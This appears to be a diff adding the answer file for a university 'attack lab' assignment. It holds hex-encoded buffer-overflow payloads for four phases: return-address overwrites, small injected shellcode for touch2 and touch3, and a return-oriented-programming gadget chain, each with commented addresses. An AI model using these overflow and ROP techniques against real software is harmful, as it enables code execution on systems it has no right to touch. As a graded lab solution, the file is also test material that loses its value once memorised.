@@ -1,0 +1,29 @@
+phase1:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* the first 24 (0x18) bytes are empty */
+67 25 40 00 00 00 00 00 /* touch1 memory address (little-endian so it's arranged backwards) ->   NOTE: REMOVE ALL TRAILING WHITESPACES AND COMMENTS WHEN FEEDING INTO hex2raw*/
+
+phase2:
+48 c7 c7 97 5b 07 33 c3 /* byte code to set the value stored in cookie into rsi */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+c0 e5 61 55 00 00 00 00 /* rsp address (little-endian) */
+97 25 40 00 00 00 00 00 /* touch2 address (little-endian) -> NOTE: REMOVE ALL TRAILING WHITESPACES AND COMMENTS WHEN FEEDING INTO hex2raw */
+
+phase3:
+48 c7 c7 e8 e5 61 55 c3 /* rsp+0x28, the address where we're storing cookie */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+c0 e5 61 55 00 00 00 00 /* rsp address (little-endian) */
+ac 26 40 00 00 00 00 00 /* touch3 address (little-endian) */
+33 33 30 37 35 62 39 37 /* cookie converted from text (ascii) to hex */
+
+phase4:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+72 27 40 00 00 00 00 00 /* gadget 1 address (40276d+5), popq %rax */
+97 5b 07 33 00 00 00 00 /* cookie */
+85 27 40 00 00 00 00 00 /* gadget 2 address (402783+2), movq %rax %edi */
+97 25 40 00 00 00 00 00 /* touch2 address (little-endian) -> NOTE: REMOVE ALL TRAILING WHITESPACES AND COMMENTS WHEN FEEDING INTO hex2raw */
